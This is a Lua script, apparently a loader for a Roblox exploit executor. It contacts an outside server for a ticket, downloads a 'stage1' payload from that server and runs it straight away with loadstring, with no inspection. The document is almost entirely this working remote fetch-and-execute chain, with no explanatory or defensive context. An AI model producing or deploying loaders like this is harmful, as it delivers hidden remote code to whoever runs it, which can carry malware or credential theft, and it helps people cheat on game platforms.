local BASE='https://scripts-server.vercel.app/api' local UA='Executor-Client/1.0' local req=(syn and syn.request) or http_request or request or (http and http.request) assert(req,'This loader requires executor HTTP (syn.request/http_request/request)') local function P(u,h,b) h=h or {} h['User-Agent']=h['User-Agent'] or UA h['content-type']=h['content-type'] or 'text/plain' local r=req({Url=u,Method='POST',Headers=h,Body=b or ' '}) assert(r,'no response') return (r.StatusCode or r.status_code),(r.Body or r.body or '') end local function R(s,n) assert(type(s)=='string' and #s>0,'empty body') local head=s:sub(1,64) assert(not head:find('<html',1,true),'got HTML') local f,e=loadstring(s,n or 'chunk') assert(f,'compile: '..tostring(e)) local ok,er=pcall(f) assert(ok,'runtime: '..tostring(er)) end local code1,tok=P(BASE..'/ticket?t='..tostring(os.time()),{['x-exec']=(identifyexecutor and identifyexecutor()) or 'executor'}) assert(code1==200,('ticket failed (code=%s, head=%s)'):format(tostring(code1),tostring(tok):sub(1,80))) local TICKET=(tok:gsub('%s+$','')) assert(#TICKET>0,'empty ticket') local code2,stub=P(BASE..'/stage1?t='..tostring(math.floor(os.clock()*1000)),{['x-exec']=(identifyexecutor and identifyexecutor()) or 'executor',['x-ticket']=TICKET}) assert(code2==200,('stage1 failed (code=%s, head=%s)'):format(tostring(code2),tostring(stub):sub(1,100))) R(stub,'stage1@stub.lua') print('[loader] delivered')
